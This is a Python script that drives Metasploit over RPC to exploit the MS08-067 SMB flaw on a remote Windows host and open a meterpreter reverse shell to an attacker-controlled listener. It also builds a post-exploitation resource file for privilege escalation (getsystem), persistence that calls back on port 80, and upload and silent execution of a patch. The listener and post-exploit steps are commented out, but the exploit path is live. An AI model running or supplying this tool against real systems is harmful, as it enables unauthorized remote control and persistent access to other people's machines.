#!/usr/bin/env python
import os
import sys
from pymetasploit3.msfrpc import MsfRpcClient
from time import sleep
import optparse

# Function to create the MSF .rc files
def builder(RHOST, LHOST, LPORT):
    post = open('/tmp/smbpost.rc', 'w')
    bat = open('/tmp/ms08067_install.bat', 'w')

    postcomms = f"""getsystem
run persistence -S -U -X -i 10 -p 80 -r {LHOST}
cd c:\
upload /tmp/ms08067_patch.exe c:\
upload /tmp/ms08067_install.bat c:\
execute -f ms08067_install.bat
    """
    batcomm = "ms08067_patch.exe /quiet"
    post.write(postcomms)
    bat.write(batcomm)
    post.close()
    bat.close()

# Sets up the chain of rc files to exploit MS08-067, setup persistence, and patch
def sploiter(RHOST, LHOST, LPORT, session):
    # Connect to Metasploit RPC using pymetasploit3
    client = MsfRpcClient('abc123', server='127.0.0.1', port=55552) #, ssl=True)  # Replace 'abc123' with your actual RPC password

    # Create a console
    console = client.consoles.console()

    # Exploit MS08-067
    commands = f"""use exploit/windows/smb/ms08_067_netapi
set PAYLOAD windows/meterpreter/reverse_tcp
set RHOST {RHOST}
set LHOST {LHOST}
set LPORT {LPORT}
set ExitOnSession false
exploit -z
    """
    print(f"[+] Exploiting MS08-067 on: {RHOST}")
    console.write(commands)

    # Wait for the exploitation process to finish
    while True:
        res = console.read()
        if res['busy']:
            sleep(1)
            continue
        print(res['data'])  # Print the output of the exploitation process
        break

    # Run Post-exploit script
    #runPost = f"""use post/multi/gather/run_console_rc_file
#set RESOURCE /tmp/smbpost.rc
#set SESSION {session}
#exploit
#   """
    #print(f"[+] Running post-exploit script on: {RHOST}")
    #console.write(runPost)

    # Wait for the post-exploit process to finish
    #while True:
        #rres = console.read()
        #if rres['busy']:
            #sleep(1)
            #continue
        #print(rres['data'])  # Print the output of the post-exploit process
        #break

    # Optional: Setup listener for persistent connection (commented out, uncomment if needed)
    # sleep(10)
    # listen = f"""use exploit/multi/handler
    # set PAYLOAD windows/meterpreter/reverse_tcp
    # set LPORT 80
    # set LHOST {LHOST}
    # exploit
    # """
    # print(f"[+] Setting up listener on: {LHOST}:80")
    # console.write(listen)
    # while True:
    #     lres = console.read()
    #     if lres['busy']:
    #         sleep(1)
    #         continue
    #     print(lres['data'])  # Print the listener's output
    #     break

def main():
    parser = optparse.OptionParser(sys.argv[0] + ' -p LPORT -r RHOST -l LHOST')
    parser.add_option('-p', dest='LPORT', type='string', help='specify a port to listen on')
    parser.add_option('-r', dest='RHOST', type='string', help='Specify a remote host')
    parser.add_option('-l', dest='LHOST', type='string', help='Specify a local host')
    parser.add_option('-s', dest='session', type='string', help='specify session ID')
    (options, args) = parser.parse_args()

    session = options.session
    RHOST = options.RHOST
    LHOST = options.LHOST
    LPORT = options.LPORT

    if (RHOST is None) or (LPORT is None) or (LHOST is None):
        print(parser.usage)
        sys.exit(0)

    #builder(RHOST, LHOST, LPORT)
    sploiter(RHOST, LHOST, LPORT, session)

if __name__ == "__main__":
    main()
